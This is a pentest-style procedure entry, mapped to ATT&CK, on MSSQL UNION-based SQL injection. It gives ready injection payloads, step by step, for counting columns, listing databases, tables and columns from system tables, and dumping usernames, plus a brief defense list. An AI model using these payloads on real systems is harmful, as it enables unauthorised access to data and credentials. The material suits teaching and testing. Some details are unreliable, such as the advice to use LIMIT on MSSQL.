---
type: procedure
description: >-
  Extract database names, tables, columns, and data from a vulnerable MSSQL
  server using UNION-based SQL injection.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
tactics:
  - '[[tactics/Discovery|TA0007 - Discovery]]'
techniques:
  - >-
    [[techniques/System Information Discovery|T1082 - System Information
    Discovery]]
sub_techniques: []
tags:
  - '[[tags/MSSQL Injection]]'
  - '[[tags/MSSQL Union Based]]'
  - sql-injection
  - database-enumeration
commands:
  - '[[commands/mssql-select-database-names]]'
  - '[[commands/mssql-select-tables-from-injection-db]]'
  - '[[commands/mssql-select-columns-from-users-table]]'
  - '[[commands/mssql-select-userid-username-from-users]]'
platforms:
  - Windows
  - Web
tools: []
validated: true
---

# MSSQL Union Based Injection for Database Enumeration

## Summary

This procedure demonstrates how to perform UNION-based SQL injection on a vulnerable MSSQL server to enumerate database names, tables, columns, and extract sensitive data such as usernames. It targets input fields susceptible to injection, appending UNION SELECT statements to retrieve information from system tables like sysdatabases and sysobjects.

## Description

UNION-based SQL injection exploits vulnerabilities in web applications that interact with MSSQL databases by injecting crafted SQL queries that append to the original query using the UNION operator. This allows attackers to extract metadata (databases, tables, columns) and actual data without disrupting the application's response format. The technique is effective against error-based or blind injections where the number of columns must match the original query. In a typical scenario, an attacker identifies a vulnerable parameter (e.g., a search field), determines the number of columns via ORDER BY testing, and then uses UNION SELECT to query system views. This provides reconnaissance for further attacks like data exfiltration or privilege escalation. Prerequisites include a vulnerable endpoint and basic SQL knowledge; it works on MSSQL versions supporting these system tables.

## Requirements

1. Access to a web application with a vulnerable SQL injection point connected to an MSSQL backend.
2. Tools for injecting and intercepting requests, such as [[tools/Burp-Suite]] or browser developer tools.
3. Knowledge of the application's query structure, including the number of columns in the original SELECT statement.
4. Network connectivity to the target server.

## Defense

- Implement prepared statements and parameterized queries to separate SQL code from user input.
- Use web application firewalls (WAFs) to detect and block common injection patterns like UNION SELECT.
- Apply least privilege to database accounts, restricting access to system tables (e.g., deny SELECT on sysobjects).
- Enable SQL Server auditing and logging to monitor anomalous queries; integrate with SIEM for alerts on injection attempts.

## Objectives

1. Enumerate all databases on the MSSQL server.
2. Identify user-created tables within a target database.
3. Retrieve column names for specific tables to understand data structure.
4. Extract sample data from tables containing sensitive information like user credentials.

## Instructions

### Step 1: Confirm Vulnerability and Match Columns

**Context**: Before enumeration, verify the injection point supports UNION by testing the number of columns in the original query. Append 'ORDER BY n--' incrementally until an error occurs; the last successful n indicates the column count. Then, inject a basic UNION SELECT with NULL values to match columns and confirm injection works.

**Command** (Custom test, not linked):
```sql
' ORDER BY 1--
' ORDER BY 2--
... (increment until error)
' UNION SELECT NULL,NULL-- (adjust NULLs to match column count)
```

> This step ensures the UNION payload aligns with the query. Expected output: No error for matching columns, revealing the injection is viable. If successful, proceed to database enumeration.

### Step 2: Extract Database Names

**Context**: Use the vulnerable parameter to inject a query against the master database's sysdatabases table to list all databases. This reveals the target's database schema for targeting user databases.

**Command** ([[commands/mssql-select-database-names]]):
```sql
SELECT name FROM master..sysdatabases
```

> Inject this via the vulnerable field, e.g., ' UNION SELECT name FROM master..sysdatabases--. Expected output: A list of database names like Injection, msdb, tempdb. Success confirms access to system metadata.

### Step 3: Extract Tables from Target Database

**Context**: Once a user database (e.g., 'Injection') is identified, query sysobjects to list user tables (xtype='U' filters to user tables only). This step narrows down to potential data stores.

**Command** ([[commands/mssql-select-tables-from-injection-db]]):
```sql
SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
```

> Inject as ' UNION SELECT name FROM Injection..sysobjects WHERE xtype = 'U'--. Expected output: Tables like Profiles, Roles, Users. Use this to select tables for column enumeration.

### Step 4: Extract Columns from Specific Table

**Context**: For a table like 'Users', query syscolumns joined with sysobjects to get column names. This reveals the data structure, enabling targeted data extraction.

**Command** ([[commands/mssql-select-columns-from-users-table]]):
```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
```

> Inject as ' UNION SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')--. Expected output: Columns like UserId, UserName. Adjust for other tables as needed.

### Step 5: Extract Data from Table

**Context**: With column names known, select specific columns from the table to dump data. This achieves the goal of sensitive information retrieval, such as credentials.

**Command** ([[commands/mssql-select-userid-username-from-users]]):
```sql
SELECT UserId, UserName FROM Users
```

> Inject as ' UNION SELECT UserId, UserName FROM Users--. Expected output: Rows of data, e.g., UserId:1, UserName:admin. Verify completeness by checking for all expected rows; if truncated, use LIMIT or paginate.

For a complete reference of these queries, see [[codes/mssql-union-based-enumeration-queries]].
